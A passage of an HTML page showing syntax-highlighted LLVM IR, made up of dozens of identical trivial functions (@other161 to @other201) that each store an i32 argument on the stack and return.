class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other161</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other162</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other163</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other164</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other165</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other166</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other167</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other168</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other169</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other170</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other171</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other172</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other173</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other174</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other175</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other176</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other177</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other178</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other179</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other180</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other181</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other182</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other183</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other184</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other185</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other186</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other187</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other188</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other189</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other190</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other191</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other192</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other193</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other194</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other195</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other196</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other197</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other198</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other199</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other200</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other201</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span 